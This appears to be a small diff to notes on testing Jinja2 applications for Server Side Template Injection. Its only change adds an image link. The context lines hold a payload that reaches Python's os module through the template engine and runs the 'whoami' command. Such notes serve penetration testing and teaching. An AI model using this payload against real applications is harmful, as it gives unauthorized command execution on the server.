@@ -27,4 +27,4 @@ when testing for Server Side Template Injection (SSTI) in a jinja 2 application 
  
  - ` {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}} `
  
- 
+ ![This is an image](pic.png)
